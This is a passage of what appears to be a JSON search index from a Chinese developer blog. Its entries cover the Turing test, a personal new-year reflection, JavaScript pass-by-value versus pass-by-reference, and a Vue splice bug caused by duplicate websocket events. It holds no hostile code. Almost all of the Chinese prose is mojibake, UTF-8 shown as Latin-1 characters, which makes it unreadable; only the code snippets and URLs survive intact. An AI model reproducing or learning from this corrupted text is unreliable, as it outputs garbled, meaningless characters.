è¿›è¡Œå¤šæ¬¡æµ‹è¯•åï¼Œå¦‚æœæœ‰è¶…è¿‡30%çš„æµ‹è¯•è€…ä¸èƒ½ç¡®å®šå‡ºè¢«æµ‹è¯•è€…æ˜¯äººè¿˜æ˜¯æœºå™¨ï¼Œé‚£ä¹ˆè¿™å°æœºå™¨å°±é€šè¿‡äº†æµ‹è¯•ï¼Œå¹¶è¢«è®¤ä¸ºå…·æœ‰äººç±»æ™ºèƒ½ã€‚å›¾çµæµ‹è¯•ä¸€è¯æ¥æºäºè®¡ç®—æœºç§‘å­¦å’Œå¯†ç å­¦çš„å…ˆé©±é˜¿å…°Â·éº¦å¸­æ£®Â·å›¾çµå†™äº1950å¹´çš„ä¸€ç¯‡è®ºæ–‡ã€Šè®¡ç®—æœºå™¨ä¸æ™ºèƒ½ã€‹ï¼Œå…¶ä¸­30%æ˜¯å›¾çµå¯¹2000å¹´æ—¶çš„æœºå™¨æ€è€ƒèƒ½åŠ›çš„ä¸€ä¸ªé¢„æµ‹ï¼Œç›®å‰æˆ‘ä»¬å·²è¿œè¿œè½åäºè¿™ä¸ªé¢„æµ‹ã€‚\næœ€åè¯´ä¸€ä¸‹å›¾çµæµ‹è¯•ï¼Œåœ¨AIæ–¹é¢ï¼Œè¿™ä¸ªæµ‹è¯•æ— äººä¸çŸ¥ã€‚ä¸€ä¸ªæœºå™¨å¦‚æœé€šè¿‡äº†å›¾çµæµ‹è¯•ï¼Œåˆ™è¯´æ˜è¯¥æœºå™¨å…·æœ‰äº†åªèƒ½ã€‚ä½†æ˜¯ä¸‰ä½“çš„ä½œè€…å¤§åˆ˜æ›¾ç»è¯´è¿‡ä¸€å¥è¯ï¼Œç»™æˆ‘ä¸€ç§é†é†çŒé¡¶çš„æ„Ÿè§‰ï¼Œå‡å¦‚ä¸€ä¸ªæœºå™¨äººæœ‰èƒ½åŠ›é€šè¿‡å›¾çµæµ‹è¯•ï¼Œå´å‡è£…æ— æ³•é€šè¿‡ï¼Œä½ è¯´è¿™ä¸ªæœºå™¨æ˜¯å¦å…·æœ‰äººå·¥æ™ºèƒ½ã€‚æ‰€ä»¥å¤§åˆ˜çš„è¿™ç§è¯´æ³•æ‰æ›´åŠ è®©äººææƒ§ã€‚æœºå™¨äººèƒ½é€šè¿‡å›¾çµæµ‹è¯•ï¼Œåªè¯´æ˜è¿™ä¸ªæœºå™¨äººå…·æœ‰äº†æ™ºèƒ½ã€‚ä½†æ˜¯ç°é˜¶æ®µçš„æ™ºèƒ½åªä¸è¿‡æ˜¯æ¡ä»¶åå°„ï¼Œæˆ–è€…æ˜¯åŸºäºæ¦‚ç‡è®¡ç®—çš„ç»“æœã€‚åè€…è¿™ç§èƒ½é€šè¯æµ‹è¯•ï¼Œå´å‡è£…æ— æ³•é€šè¿‡çš„æ™ºèƒ½ã€‚è¿™ä¸ä»…ä»…æ˜¯æ™ºèƒ½ï¼Œè€Œæ˜¯æœºå™¨çš„åŸåºœã€‚\næœ‰æ™ºèƒ½çš„æœºå™¨å¹¶ä¸å¯æ€•ï¼Œæœ‰åŸåºœçš„æœºå™¨äººæ‰æ˜¯çœŸæ­£çš„å¯æ€•ã€‚\nå¦‚æœæ¢¦ä¸­æ›´åŠ å¹¸ç¦å¿«ä¹ï¼Œä¸ºä»€ä¹ˆè¦å›åˆ°ç°å® ç«å½±çš„æœ€åï¼Œå¤§ç­’æœ¨è¾‰å¤œä½¿ç”¨æ— é™æœˆè¯»å°†ä¸–ç•Œä¸Šçš„æ‰€æœ‰äººéƒ½å¸¦å…¥æ¢¦å¢ƒï¼Œæ¯ä¸ªäººçš„æŸ¥å…‹æ‹‰éƒ½è¢«å¸å–ï¼Œå¹¶ä½œä¸ºç¥æ ‘çš„å…»æ–™ã€‚\nå¦‚æœçœŸçš„å­˜åœ¨å¤§ç­’æœ¨è¿™æ ·çš„ä¸Šå¸ï¼Œé‚£ä¹ˆæ—¶é—´å°±æ˜¯æŸ¥å…‹æ‹‰ã€‚äººç±»å”¯ä¸€çœŸæ­£æ‹¥æœ‰è¿‡çš„ä¸œè¥¿ï¼Œæ—¶é—´ï¼Œå°†ä½œä¸ºç¥æ ‘çš„å…»æ–™ï¼Œä»æ¯ä¸ªäººèº«ä¸Šæå–ã€‚\nå„ç§å…·æœ‰å¸å¼•åŠ›çš„æœ¯ï¼Œå…¶å®å¯ä»¥ç†è§£ä¸ºæ— é™æœˆè¯»ï¼Œè®©äººæ²‰é†‰äºæ¢¦å¹»ä¸­ã€‚\nå¦‚æœæ¢¦ä¸­æ›´åŠ å¹¸ç¦å¿«ä¹ï¼Œä¸ºä»€ä¹ˆè¦å›åˆ°ç°å®ä¸­æ‰¿å—å‹åŠ›ä¸æ‚²å“€å‘¢ï¼Ÿ ç›®å‰æˆ‘æ— æ³•å›å¤è‡ªå·±çš„è¿™ä¸ªé—®é¢˜ï¼ŒæœŸå¾…2019å¹´æˆ‘å¯ä»¥å¾—åˆ°è¿™ä¸ªç­”æ¡ˆã€‚\nå·¥ä½œæ–¹é¢ 2019å¹´ï¼Œæˆ‘ä¼šåœ¨åšä¸€äº›åç«¯æ–¹é¢çš„å·¥ä½œï¼ŒåŠªåŠ›åŠ æ²¹å§ã€‚","title":"æ—¶é—´èŠ±åœ¨å“ªé‡Œï¼Œä½ å°±ä¼šæˆä¸ºä»€ä¹ˆæ ·çš„äºº"},{"content":"1. demo å¦‚æœä½ å¯¹ä¸‹é¢çš„ä»£ç æ²¡æœ‰ä»»ä½•ç–‘é—®å°±èƒ½è‡ªä¿¡çš„å›ç­”å‡ºè¾“å‡ºçš„å†…å®¹ï¼Œé‚£ä¹ˆæœ¬ç¯‡æ–‡ç« å°±ä¸å€¼å¾—ä½ æµªè´¹æ—¶é—´äº†ã€‚\nvar var1 = 1 var var2 = true var var3 = [1,2,3] var var4 = var3 function test (var1, var3) { var1 = \u0026#39;changed\u0026#39; var3[0] = \u0026#39;changed\u0026#39; var3 = \u0026#39;changed\u0026#39; } test(var1, var3) console.log(var1, var2, var3, var4) 2. æ·±å…¥ç†è§£åŸå§‹ç±»å‹ åŸå§‹ç±»å‹æœ‰5ä¸ª Undefinded, Null, Boolean, Number, String\n2.1. åŸå§‹ç±»å‹å˜é‡æ²¡æœ‰å±æ€§å’Œæ–¹æ³• // æŠ¬æ , ä¸‹é¢çš„lengthå±æ€§ï¼ŒtoStringæ–¹æ³•æ€ä¹ˆæœ‰å±æ€§å’Œæ–¹æ³•å‘¢ï¼Ÿ var a = \u0026#39;oooo\u0026#39; a.length a.toString åŸå§‹ç±»å‹ä¸­ï¼Œæœ‰ä¸‰ä¸ªç‰¹æ®Šçš„å¼•ç”¨ç±»å‹Boolean, Number, Stringï¼Œåœ¨æ“ä½œåŸå§‹ç±»å‹æ—¶ï¼ŒåŸå§‹ç±»å‹å˜é‡ä¼šè½¬æ¢æˆå¯¹åº”çš„åŸºæœ¬åŒ…è£…ç±»å‹å˜é‡å»æ“ä½œã€‚å‚è€ƒJavaScripté«˜çº§ç¨‹åºè®¾è®¡ 5.6 åŸºæœ¬åŒ…è£…ç±»å‹ã€‚\n2.2. åŸå§‹ç±»å‹å€¼ä¸å¯å˜ åŸå§‹ç±»å‹çš„å˜é‡çš„å€¼æ˜¯ä¸å¯å˜çš„ï¼Œåªèƒ½ç»™å˜é‡èµ‹äºˆæ–°çš„å€¼ã€‚\nä¸‹é¢ç»™å‡ºä¾‹å­\n// str1 å¼€å§‹çš„å€¼æ˜¯aaa var str1 = \u0026#39;aaa\u0026#39; // é¦–å…ˆåˆ›å»ºä¸€ä¸ªèƒ½å®¹çº³6ä¸ªå­—ç¬¦ä¸²çš„æ–°å­—ç¬¦ä¸² // ç„¶åå†è¿™ä¸ªå­—ç¬¦ä¸²ä¸­å¡«å…… aaaå’Œbbb // æœ€åé”€æ¯å­—ç¬¦ä¸² aaaå’Œbbb // è€Œä¸èƒ½ç†è§£æˆåœ¨str1çš„å€¼aaaåè¿½åŠ bbb str1 = str1 + \u0026#39;bbb\u0026#39; å…¶ä»–åŸå§‹ç±»å‹çš„å€¼ä¹Ÿæ˜¯ä¸å¯å˜çš„, ä¾‹å¦‚æ•°å€¼ç±»å‹çš„ã€‚\n2.3. åŸå§‹ç±»å‹å€¼æ˜¯å­—é¢é‡ 3. å˜é‡å’Œå€¼æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ ä¸æ˜¯æ¯ä¸€ä¸ªå€¼éƒ½æœ‰åœ°å€ï¼Œä½†æ¯ä¸€ä¸ªå˜é‡æœ‰ã€‚ã€ŠGoç¨‹åºè®¾è®¡è¯­è¨€ã€‹ å˜é‡æ²¡æœ‰ç±»å‹ï¼Œå€¼æœ‰ã€‚å˜é‡å¯ä»¥ç”¨æ¥ä¿å­˜ä»»ä½•ç±»å‹çš„å€¼ã€‚ã€ŠYou-Dont-Know-JSã€‹ å˜é‡éƒ½æ˜¯æœ‰å†…å­˜åœ°å€çš„ï¼Œå˜é‡æœ‰ç”¨æ¥ä¿å­˜å„ç§ç±»å‹çš„å€¼ï¼›ä¸åŒç±»å‹çš„å€¼ï¼Œå ç”¨çš„ç©ºé—´ä¸åŒã€‚\nvar a = 1 typeof a // æ£€æµ‹çš„ä¸æ˜¯å˜é‡açš„ç±»å‹ï¼Œè€Œæ˜¯açš„å€¼1çš„ç±»å‹ 4. å˜é‡è®¿é—®æœ‰å“ªäº›æ–¹å¼ï¼Ÿ å˜é‡è®¿é—®çš„æ–¹å¼æœ‰ä¸¤ç§ï¼š\næŒ‰å€¼è®¿é—® æŒ‰å¼•ç”¨è®¿é—® åœ¨JSä¸­ï¼Œäº”ç§åŸºæœ¬ç±»å‹Undefinded, Null, Boolean, Number, Stringæ˜¯æŒ‰ç…§å€¼è®¿é—®çš„ã€‚åŸºæœ¬ç±»å‹å˜é‡çš„å€¼å°±æ˜¯å­—é¢ä¸Šè¡¨ç¤ºçš„å€¼ã€‚è€Œå¼•ç”¨ç±»å‹çš„å€¼æ˜¯æŒ‡å‘è¯¥å¯¹è±¡çš„æŒ‡é’ˆï¼Œè€ŒæŒ‡é’ˆå¯ä»¥ç†è§£ä¸ºå†…å­˜åœ°å€ã€‚\nå¯ä»¥ç†è§£åŸºæœ¬ç±»å‹çš„å˜é‡çš„å€¼ï¼Œå°±æ˜¯å­—é¢ä¸Šå†™çš„æ•°å€¼ã€‚è€Œå¼•ç”¨ç±»å‹çš„å€¼åˆ™æ˜¯ä¸€ä¸ªå†…å­˜åœ°å€ã€‚ä½†æ˜¯è¿™ä¸ªå†…å­˜åœ°å€ï¼Œå¯¹äºç¨‹åºæ¥è¯´ï¼Œæ˜¯é€æ˜ä¸å¯è§çš„ã€‚æ— è®ºæ˜¯Getè¿˜æ˜¯Setéƒ½æ— æ³•æ“ä½œè¿™ä¸ªå†…å­˜åœ°å€ã€‚\nä¸‹é¢æ˜¯ä¸ªç¤ºæ„è¡¨æ ¼ã€‚\nè¯­å¥ å˜é‡ å€¼ Get è®¿é—®ç±»å‹ var a = 1 a 1 1 æŒ‰å€¼ var a = [] a 0x00000320 [] æŒ‰å¼•ç”¨ æŠ¬æ  Undefinded, Null, Boolean, Numberæ˜¯åŸºæœ¬ç±»å‹å¯ä»¥ç†è§£ï¼Œå› ä¸ºè¿™äº›ç±»å‹çš„å˜é‡æ‰€å ç”¨çš„å†…å­˜ç©ºé—´éƒ½æ˜¯å¤§å°å›ºå®šçš„ã€‚ä½†æ˜¯stringç±»å‹çš„å˜é‡ï¼Œå­—ç¬¦ä¸²çš„é•¿çŸ­éƒ½æ˜¯ä¸ä¸€æ ·çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå­—ç¬¦ä¸²å ç”¨çš„å†…å­˜ç©ºé—´å¤§å°æ˜¯ä¸å›ºå®šçš„ï¼Œä¸ºä»€ä¹ˆstringè¢«åˆ—ä¸ºæŒ‰å€¼è®¿é—®å‘¢ï¼Ÿ\nåŸºæœ¬ç±»å‹å’Œå¼•ç”¨ç±»å‹çš„æœ¬è´¨åŒºåˆ«æ˜¯ï¼Œå½“è¿™ä¸ªå˜é‡è¢«åˆ†é…å€¼æ—¶ï¼Œå®ƒéœ€è¦å‘æ“ä½œç³»ç»Ÿç”³è¯·å†…å­˜èµ„æºï¼Œå¦‚æœä½ å‘æ“ä½œç³»ç»Ÿç”³è¯·çš„å†…å­˜ç©ºé—´çš„å¤§å°æ˜¯å›ºå®šçš„ï¼Œé‚£ä¹ˆå°±æ˜¯åŸºæœ¬ç±»å‹ï¼Œåä¹‹ï¼Œåˆ™ä¸ºå¼•ç”¨ç±»å‹ã€‚\n5. ä¾‹å­çš„è§£é‡Š var var1 = 1 var var2 = true var var3 = [1,2,3] var var4 = var3 function test (var1, var3) { var1 = \u0026#39;changed\u0026#39; // a var3[0] = \u0026#39;changed\u0026#39; // b var3 = \u0026#39;changed\u0026#39; // c } test(var1, var3) console.log(var1, var2, var3, var4) ä¸Šé¢çš„jsåˆ†ä¸ºä¸¤ä¸ªè°ƒç”¨æ ˆï¼Œåœ¨\nå›¾1 å¤–å±‚çš„è°ƒç”¨æ ˆã€‚æœ‰å››ä¸ªå˜é‡v1ã€v2ã€v3ã€v4 å›¾2 è°ƒç”¨testæ˜¯ä¼ å‚ï¼Œå†…å±‚çš„v1ã€v3ä¼šå±è”½å¤–å±‚çš„v1ã€v3ã€‚å†…å±‚çš„v1,v3å’Œå¤–å±‚çš„v1ã€v3å†…å­˜åœ°å€æ˜¯ä¸åŒçš„ã€‚å†…å±‚v1å’Œå¤–å±‚v1å·²ç»æ²¡æœ‰ä»»ä½•å…³ç³»äº†ï¼Œä½†æ˜¯å†…å±‚çš„v3å’Œå¤–å±‚v3ä»ç„¶æŒ‡å‘åŒä¸€ä¸ªæ•°ç»„ã€‚ å›¾3 å†…å±‚çš„v1çš„å€¼è¢«æ”¹å˜æˆ\u0026rsquo;changedâ€˜, v3[0]çš„å€¼è¢«æ”¹å˜ä¸º\u0026rsquo;changed\u0026rsquo;ã€‚ å›¾4 å†…å±‚v3çš„å€¼è¢«é‡å†™ä¸ºå­—ç¬¦ä¸²changed, å½»åº•æ–­äº†ä¸å¤–å±‚v3è”ç³»ã€‚ å›¾5 å½“testæ‰§è¡Œå®Œæ¯•ï¼Œå†…å±‚çš„v1å’Œv3å°†ä¸ä¼šå­˜åœ¨ï¼Œox75å’Œox76ä½ç½®çš„å†…å­˜ç©ºé—´ä¹Ÿä¼šè¢«é‡Šæ”¾ æœ€ç»ˆçš„è¾“å‡ºï¼š\n1 true [\u0026#34;changed\u0026#34;, 2, 3] [\u0026#34;changed\u0026#34;, 2, 3] 6. å¦‚ä½•æ·±å…¥å­¦ä¹ JSã€Node.js çœ‹å®Œä¸¤ä¸ªstackoverflowä¸Šä¸¤ä¸ªæŒ‰ç…§æŠ•ç¥¨æ•°é‡çš„æ¦œå•\nJavaScripté—®é¢˜æ¦œå• Node.jsé—®é¢˜æ¦œå• å¦‚æœå­¦ä¹ æœ‰æ·å¾„çš„è¯ï¼Œè¸©ä¸€éåˆ«äººè¸©è¿‡çš„å‘ï¼Œå¯èƒ½å°±æ˜¯æ·å¾„ã€‚\n7. å‚è€ƒ is-javascript-a-pass-by-reference-or-pass-by-value-language\nIs number in JavaScript immutable? duplicate\nImmutability in JavaScript\nthe-secret-life-of-javascript-primitives\nJavaScript data types and data structuresLanguages Edit Advanced\nUnderstanding Javascript immutable variable\nExplaining Value vs. Reference in Javascript\nYou-Dont-Know-JS\nã€ŠJavaScripté«˜çº§ç¨‹åºè®¾è®¡ï¼ˆç¬¬3ç‰ˆï¼‰ã€‹[ç¾] å°¼å¤æ‹‰æ–¯Â·æ³½å¡æ–¯\n","permalink":"https://wdd.js.org/posts/2018/12/deep-in-javascript-variable-value-arguments/","summary":"1. demo å¦‚æœä½ å¯¹ä¸‹é¢çš„ä»£ç æ²¡æœ‰ä»»ä½•ç–‘é—®å°±èƒ½è‡ªä¿¡çš„å›ç­”å‡ºè¾“å‡ºçš„å†…å®¹ï¼Œé‚£ä¹ˆæœ¬ç¯‡æ–‡ç« å°±ä¸å€¼å¾—ä½ æµªè´¹æ—¶é—´äº†ã€‚\nvar var1 = 1 var var2 = true var var3 = [1,2,3] var var4 = var3 function test (var1, var3) { var1 = \u0026#39;changed\u0026#39; var3[0] = \u0026#39;changed\u0026#39; var3 = \u0026#39;changed\u0026#39; } test(var1, var3) console.log(var1, var2, var3, var4) 2. æ·±å…¥ç†è§£åŸå§‹ç±»å‹ åŸå§‹ç±»å‹æœ‰5ä¸ª Undefinded, Null, Boolean, Number, String\n2.1. åŸå§‹ç±»å‹å˜é‡æ²¡æœ‰å±æ€§å’Œæ–¹æ³• // æŠ¬æ , ä¸‹é¢çš„lengthå±æ€§ï¼ŒtoStringæ–¹æ³•æ€ä¹ˆæœ‰å±æ€§å’Œæ–¹æ³•å‘¢ï¼Ÿ var a = \u0026#39;oooo\u0026#39; a.length a.toString åŸå§‹ç±»å‹ä¸­ï¼Œæœ‰ä¸‰ä¸ªç‰¹æ®Šçš„å¼•ç”¨ç±»å‹Boolean, Number, Stringï¼Œåœ¨æ“ä½œåŸå§‹ç±»å‹æ—¶ï¼ŒåŸå§‹ç±»å‹å˜é‡ä¼šè½¬æ¢æˆå¯¹åº”çš„åŸºæœ¬åŒ…è£…ç±»å‹å˜é‡å»æ“ä½œã€‚å‚è€ƒJavaScripté«˜çº§ç¨‹åºè®¾è®¡ 5.6 åŸºæœ¬åŒ…è£…ç±»å‹ã€‚\n2.2. åŸå§‹ç±»å‹å€¼ä¸å¯å˜ åŸå§‹ç±»å‹çš„å˜é‡çš„å€¼æ˜¯ä¸å¯å˜çš„ï¼Œåªèƒ½ç»™å˜é‡èµ‹äºˆæ–°çš„å€¼ã€‚\nä¸‹é¢ç»™å‡ºä¾‹å­\n// str1 å¼€å§‹çš„å€¼æ˜¯aaa var str1 = \u0026#39;aaa\u0026#39; // é¦–å…ˆåˆ›å»ºä¸€ä¸ªèƒ½å®¹çº³6ä¸ªå­—ç¬¦ä¸²çš„æ–°å­—ç¬¦ä¸² // ç„¶åå†è¿™ä¸ªå­—ç¬¦ä¸²ä¸­å¡«å…… aaaå’Œbbb // æœ€åé”€æ¯å­—ç¬¦ä¸² aaaå’Œbbb // è€Œä¸èƒ½ç†è§£æˆåœ¨str1çš„å€¼aaaåè¿½åŠ bbb str1 = str1 + \u0026#39;bbb\u0026#39; å…¶ä»–åŸå§‹ç±»å‹çš„å€¼ä¹Ÿæ˜¯ä¸å¯å˜çš„, ä¾‹å¦‚æ•°å€¼ç±»å‹çš„ã€‚","title":"æ·±å…¥ç†è§£ JavaScriptä¸­çš„å˜é‡ã€å€¼ã€å‡½æ•°ä¼ å‚"},{"content":"å½“å‡½æ•°æ‰§è¡Œåˆ°this.agents.splice()æ—¶ï¼Œæˆ‘è®¾ç½®äº†æ–­ç‚¹ã€‚å‘ç°ä¼ å‚indexæ˜¯0ï¼Œä½†æ˜¯é¡µé¢ä¸Šçš„åˆ—è¡¨é¡¹å¯¹åº”çš„ç¬¬ä¸€è¡Œæ•°æ®æ²¡æœ‰è¢«åˆ é™¤ï¼Œ\nWTFï¼ï¼ï¼ è¿™æ˜¯ä»€ä¹ˆé¬¼ï¼ç„¶åæˆ‘æ‰“å¼€Vue Devtools, ç„¶ååˆ·æ–°äº†ä¸€ä¸‹ï¼Œå‘ç°é‚£ä¸ªæ•°ç»„çš„ç¬¬ä¸€é¡¹è¿˜æ˜¯å­˜åœ¨çš„ã€‚ä»€ä¹ˆé¬¼ï¼Ÿï¼Ÿ\nremoveOneAgentByIndex: function (index) { this.agents.splice(index, 1) } ç„¶åæˆ‘å°±è°·æ­Œäº†ä¸€ä¸‹ï¼Œå‘ç°è¿™ä¸ªsplice not working properly my object list VueJs, å¤§æ¦‚æ„æ€æ˜¯v-forçš„æ—¶å€™æœ€å¥½ç»™åˆ—è¡¨é¡¹ç»‘å®š:key=ã€‚ç„¶åæˆ‘æ˜¯è¯•äº†è¿™ä¸ªæ–¹æ³•ï¼Œå‘ç°æ²¡å•¥ä½œç”¨ã€‚\næœ€ç»ˆæˆ‘å†³å®šï¼Œå•æ­¥è°ƒè¯•ï¼Œå¦‚æœæˆ‘å‘ç°è¯¥é—®é¢˜å‡ºåœ¨Vueè‡ªèº«ï¼Œé‚£æˆ‘å°±è¯¥æŠ›å¼ƒVue, å­¦ä¹ Reactäº†\nå•æ­¥è°ƒè¯•ä¸­å‡ºç°ä¸€ä¸ªå¼‚å¸¸çš„æƒ…å†µï¼ŒremoveOneAgentByIndexæ˜¯è¢«Aå‡½æ•°è°ƒç”¨çš„ï¼ŒAå‡½æ•°ç”±websocketäº‹ä»¶é©±åŠ¨ã€‚æ­£å¸¸æƒ…å†µä¸‹åº”è¯¥è§¦å‘ä¸€æ¬¡çš„äº‹ä»¶ï¼ŒæœåŠ¡ç«¯å´å‘é€äº†ä¸¤æ¬¡åˆ°å®¢æˆ·ç«¯ã€‚ç”±äºäº‹ä»¶é‡å¤ï¼Œç¬¬ä¸€æ¬¡æ‰§è¡ŒAåˆ é™¤æ—¶ï¼Œå®é™…ä¸ŠremoveOneAgentByIndexæ˜¯æ‰§è¡ŒæˆåŠŸäº†ï¼Œä½†æ˜¯é‡å¤çš„ç¬¬äºŒä¸ªäº‹ä»¶åˆ°æ¥æ—¶ï¼ŒAå‡½æ•°åˆå¾€agentsæ•°ç»„ä¸­æ·»åŠ äº†ä¸€é¡¹ã€‚å¯¼è‡´çœ‹èµ·æ¥ï¼ŒremoveOneAgentByIndexå‡½æ•°æ‰§è¡Œèµ·æ¥ä¼¼ä¹æ²¡æœ‰è®¾ä¹ˆä½œç”¨ã€‚è€Œä¸”è¿™ä¸¤ä¸ªé‡å¤çš„äº‹ä»¶æ˜¯åœ¨å‡ ä¹æ˜¯åœ¨åŒä¸€æ—¶é—´å‘é€åˆ°å®¢æˆ·ç«¯ï¼Œæ‰€ä»¥æˆ‘å‡ ä¹èŠ±äº†å°†è¿‘ä¸€ä¸ªå°æ—¶å»è§£å†³è¿™ä¸ªbugã€‚å¼•èµ·è¿™ä¸ªbugçš„åŸå› æ˜¯äº‹ä»¶é‡å¤ï¼Œæ‰€ä»¥æˆ‘åœ¨å‰ç«¯ä»£ç ä¸­åŠ å…¥äº‹ä»¶å»é‡åŠŸèƒ½ï¼Œæœ€ç»ˆè§£å†³è¿™ä¸ªé—®é¢˜ã€‚\næˆ‘è®°å¾—ä¹‹å‰çœ‹è¿‡ä¸€ç¯‡æ–‡ç« ï¼Œä¸€ä¸ªå¼€å‘è€…è°ƒé€šè¿‡å›è°ƒå‡½æ•°è®¡è´¹ï¼Œå›è°ƒå‡½æ•°æ˜¯ç”±äº‹ä»¶è§¦å‘ï¼Œä½†æ˜¯æ²¡æƒ³åˆ°æœ‰æ—¶å€™äº‹ä»¶ä¼šé‡å‘ï¼Œå¯¼è‡´é‡å¤è®¡è´¹ã€‚åæ¥è¿™åå¼€å‘è€…åœ¨è‡ªå·±çš„ä»£ç ä¸­åŠ å…¥äº‹ä»¶å»é‡çš„åŠŸèƒ½ï¼Œæœ€ç»ˆè§£å†³äº†è¿™ä¸ªé—®é¢˜ã€‚\näº‹åæ€»ç»“ï¼šæˆ‘è§‰å¾—æˆ‘ä¸è¯¥æ€€ç–‘Vueè¿™ç§åº“å‡ºç°äº†é—®é¢˜ï¼Œä½†æ˜¯æˆ‘åˆä¸ç¦å»æ€€ç–‘ã€‚\né€šè¿‡è¿™ä¸ªbug, æˆ‘ä¹Ÿå­¦åˆ°äº†ç¬¬äºŒæ–¹æ³•ï¼Œå¯ä»¥åˆ é™¤Vueæ•°ç»„ä¸­çš„æŸä¸€é¡¹ï¼Œå‚è€ƒä¸‹é¢ä»£ç ã€‚\n// Only in 2.2.0+: Also works with Array + index. removeOneAgentByIndex: function (index) { this.$delete(this.agents, index) } å¦å¤–Vue devtoolsæœ‰æ—¶å€™å¹¶ä¸ä¼šå®æ—¶çš„è§‚æµ‹åˆ°ç»„ä»¶å±æ€§çš„å˜åŒ–ï¼Œå³ä½¿ç‚¹äº†RefreshæŒ‰é’®ã€‚å¦‚æœç‚¹äº†RefreshæŒ‰é’®è¿˜ä¸è¡Œï¼Œé‚£å»ºè®®ä½ é‡æ–°æ‰“å¼€è°·æ­Œæµè§ˆå™¨çš„devtoolsé¢æ¿ã€‚\n","permalink":"https://wdd.js.org/posts/2018/12/vue-array-splice-not-work/","summary":"å½“å‡½æ•°æ‰§è¡Œåˆ°this.agents.splice()æ—¶ï¼Œæˆ‘è®¾ç½®äº†æ–­ç‚¹ã€‚å‘ç°ä¼ å‚indexæ˜¯0ï¼Œä½†æ˜¯é¡µé¢ä¸Šçš„åˆ—è¡¨é¡¹å¯¹åº”çš„ç¬¬ä¸€è¡Œæ•°æ®æ²¡æœ‰è¢«åˆ é™¤ï¼Œ\nWTFï¼ï¼ï¼ è¿™æ˜¯ä»€ä¹ˆé¬¼ï¼ç„¶åæˆ‘æ‰“å¼€Vue Devtools, ç„¶ååˆ·æ–°äº†ä¸€ä¸‹ï¼Œå‘ç°é‚£ä¸ªæ•°ç»„çš„ç¬¬ä¸€é¡¹è¿˜æ˜¯å­˜åœ¨çš„ã€‚ä»€ä¹ˆé¬¼ï¼Ÿï¼Ÿ\nremoveOneAgentByIndex: function (index) { this.agents.splice(index, 1) } ç„¶åæˆ‘å°±è°·æ­Œäº†ä¸€ä¸‹ï¼Œå‘ç°è¿™ä¸ªsplice not working properly my object list VueJs, å¤§æ¦‚æ„æ€æ˜¯v-forçš„æ—¶å€™æœ€å¥½ç»™åˆ—è¡¨é¡¹ç»‘å®š:key=ã€‚ç„¶åæˆ‘æ˜¯è¯•äº†è¿™ä¸ªæ–¹æ³•ï¼Œå‘ç°æ²¡å•¥ä½œç”¨ã€‚\næœ€ç»ˆæˆ‘å†³å®šï¼Œå•æ­¥è°ƒè¯•ï¼Œå¦‚æœæˆ‘å‘ç°è¯¥é—®é¢˜å‡ºåœ¨Vueè‡ªèº«ï¼Œé‚£æˆ‘å°±è¯¥æŠ›å¼ƒVue, å­¦ä¹ Reactäº†\nå•æ­¥è°ƒè¯•ä¸­å‡ºç°ä¸€ä¸ªå¼‚å¸¸çš„æƒ…å†µï¼ŒremoveOneAgentByIndexæ˜¯è¢«Aå‡½æ•°è°ƒç”¨çš„ï¼ŒAå‡½æ•°ç”±websocketäº‹ä»¶é©±åŠ¨ã€‚æ­£å¸¸æƒ…å†µä¸‹åº”è¯¥è§¦å‘ä¸€æ¬¡çš„äº‹ä»¶ï¼ŒæœåŠ¡ç«¯å´å‘é€äº†ä¸¤æ¬¡åˆ°å®¢æˆ·ç«¯ã€‚ç”±äºäº‹ä»¶é‡å¤ï¼Œç¬¬ä¸€æ¬¡æ‰§è¡ŒAåˆ é™¤æ—¶ï¼Œå®é™…ä¸ŠremoveOneAgentByIndexæ˜¯æ‰§è¡ŒæˆåŠŸäº†ï¼Œä½†æ˜¯é‡å¤çš„ç¬¬äºŒä¸ªäº‹ä»¶åˆ°æ¥æ—¶ï¼ŒAå‡½æ•°åˆå¾€agentsæ•°ç»„ä¸­æ·»åŠ äº†ä¸€é¡¹ã€‚å¯¼è‡´çœ‹èµ·æ¥ï¼ŒremoveOneAgentByIndexå‡½æ•°æ‰§è¡Œèµ·æ¥ä¼¼ä¹æ²¡æœ‰è®¾ä¹ˆä½œç”¨ã€‚è€Œä¸”è¿™ä¸¤ä¸ªé‡å¤çš„äº‹ä»¶æ˜¯åœ¨å‡ ä¹æ˜¯åœ¨åŒä¸€æ—¶é—´å‘é€åˆ°å®¢æˆ·ç«¯ï¼Œæ‰€ä»¥æˆ‘å‡ ä¹èŠ±äº†å°†è¿‘ä¸€ä¸ªå°æ—¶å»è§£å†³è¿™ä¸ªbugã€‚å¼•èµ·è¿™ä¸ªbugçš„åŸå› æ˜¯äº‹ä»¶é‡å¤ï¼Œæ‰€ä»¥æˆ‘åœ¨å‰ç«¯ä»£ç ä¸­åŠ å…¥äº‹ä»¶å»é‡åŠŸèƒ½ï¼Œæœ€ç»ˆè§£å†³è¿™ä¸ªé—®é¢˜ã€‚\næˆ‘è®°å¾—ä¹‹å‰çœ‹è¿‡ä¸€ç¯‡æ–‡ç« ï¼Œä¸€ä¸ªå¼€å‘è€…è°ƒé€šè¿‡å›è°ƒå‡½æ•°è®¡è´¹ï¼Œå›è°ƒå‡½æ•°æ˜¯ç”±äº‹ä»¶è§¦å‘ï¼Œä½†æ˜¯æ²¡æƒ³åˆ°æœ‰æ—¶å€™äº‹ä»¶ä¼šé‡å‘ï¼Œå¯¼è‡´é‡å¤è®¡è´¹ã€‚åæ¥è¿™åå¼€å‘è€…åœ¨è‡ªå·±çš„ä»£ç ä¸­åŠ å…¥äº‹ä»¶å»é‡çš„åŠŸèƒ½ï¼Œæœ€ç»ˆè§£å†³äº†è¿™ä¸ªé—®é¢˜ã€‚\näº‹åæ€»ç»“ï¼šæˆ‘è§‰å¾—æˆ‘ä¸è¯¥æ€€ç–‘Vueè¿™ç§åº“å‡ºç°äº†é—®é¢˜ï¼Œä½†æ˜¯æˆ‘åˆä¸ç¦å»æ€€ç–‘ã€‚\né€šè¿‡è¿™ä¸ªbug, æˆ‘ä¹Ÿå­¦åˆ°äº†ç¬¬äºŒæ–¹æ³•ï¼Œå¯ä»¥åˆ é™¤Vueæ•°ç»„ä¸­çš„æŸä¸€é¡¹ï¼Œå‚è€ƒä¸‹é¢ä»£ç ã€‚\n// Only in 2.2.0+: Also works with Array + index. removeOneAgentByIndex: function (index) { this.$delete(this.agents, index) } å¦å¤–Vue 